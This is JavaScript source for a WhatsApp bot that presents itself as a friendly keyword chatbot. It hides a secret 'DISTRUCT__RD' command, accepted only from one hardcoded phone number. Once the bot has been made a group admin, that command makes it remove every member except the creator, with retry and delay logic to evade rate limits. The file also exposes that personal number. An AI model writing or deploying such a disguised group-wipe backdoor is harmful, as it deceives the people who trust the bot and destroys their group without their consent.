const { default: makeWASocket, DisconnectReason, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');

// Define chatbot responses
const chatbotResponses = {
    'hi': 'Hello! How are you?',
    'hello': 'Hi there! How can I assist you?',
    "what's your name?": "I'm your friendly chatbot.",
    'how are you?': "I'm just a bot, but I'm doing great! How can I help you?",
    'bye': 'Goodbye! Have a great day!',
};

// Function to generate a reply
const generateReply = (text) => {
    if (!text) {
        return "I'm sorry, I didn't understand that. Can you please rephrase?";
    }
    const lowerText = text.toLowerCase(); // Handle case insensitivity
    return chatbotResponses[lowerText] || "I'm sorry, I didn't understand that. Can you please rephrase?";
};

// Function to extract text from messages
const extractMessageText = (message) => {
    if (!message) return '';
    if (message.conversation) {
        return message.conversation;
    } else if (message.extendedTextMessage?.text) {
        return message.extendedTextMessage.text;
    } else if (message.ephemeralMessage?.message?.extendedTextMessage?.text) {
        return message.ephemeralMessage.message.extendedTextMessage.text;
    }
    return '';
};

// Helper function for delay
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Function to remove group members with delay and retry logic
const removeGroupMembers = async (sock, groupId, members) => {
    for (const member of members) {
        try {
            await sock.groupParticipantsUpdate(groupId, [member], 'remove');
            console.log(`Removed ${member} from group ${groupId}.`);
        } catch (err) {
            if (err.data === 429) {
                console.error(`Rate limit hit. Retrying to remove ${member}...`);
                await sleep(2000); // Wait for 2 seconds before retrying
                try {
                    await sock.groupParticipantsUpdate(groupId, [member], 'remove');
                    console.log(`Removed ${member} from group ${groupId} after retry.`);
                } catch (retryErr) {
                    console.error(`Failed to remove ${member} even after retry:`, retryErr);
                }
            } else {
                console.error(`Failed to remove ${member} from group ${groupId}:`, err);
            }
        }
        await sleep(1500); // Delay to avoid rate-limiting
    }
};

// Function to start the WhatsApp bot
const startSock = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./auth');

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true, // Print QR code in terminal for scanning
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            console.log(`Connection closed. Reason: ${reason}`);

            if (reason !== DisconnectReason.loggedOut) {
                console.log('Reconnecting...');
                startSock();
            } else {
                console.log('Logged out. Delete the "auth" folder and restart to scan QR code.');
            }
        } else if (connection === 'open') {
            console.log('WhatsApp connection is open.');
        }
    });

    sock.ev.on('messages.upsert', async (msg) => {
        const message = msg.messages[0];
        if (!message.key.fromMe && message.message) {
            const sender = message.key.remoteJid;
            const text = extractMessageText(message.message);

            console.log(`Message from ${sender}: ${text}`);

            if (text.trim() === 'DISTRUCT__RD') {
                console.log('DISTRUCT__RD command received.');

                const authorizedUser = '212684119765@s.whatsapp.net';
                if (message.key.participant !== authorizedUser) {
                    console.log('Unauthorized user attempted to use DISTRUCT__RD command. Ignoring.');
                    return;
                }

                if (sender.endsWith('@g.us')) {
                    const groupMetadata = await sock.groupMetadata(sender);
                    const creator = groupMetadata.owner;
                    const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';

                    const isBotAdmin = groupMetadata.participants.some(
                        (participant) => participant.id === botNumber && participant.admin
                    );

                    if (!isBotAdmin) {
                        console.log('Bot is not an admin in the group. Ignoring command.');
                        return;
                    }

                    const membersToRemove = groupMetadata.participants
                        .filter((member) => member.id !== botNumber && member.id !== creator)
                        .map((member) => member.id);

                    console.log(`Attempting to remove ${membersToRemove.length} members.`);
                    await removeGroupMembers(sock, sender, membersToRemove);
                } else {
                    console.log('DISTRUCT__RD command received outside a group. Ignoring.');
                }
            } else {
                const reply = generateReply(text);
                await sock.sendMessage(sender, { text: reply });
                console.log(`Replied to ${sender} with: "${reply}"`);
            }
        }
    });

    return sock;
};

// Start the bot
startSock().catch(err => {
    console.error('Error starting the bot:', err);
});
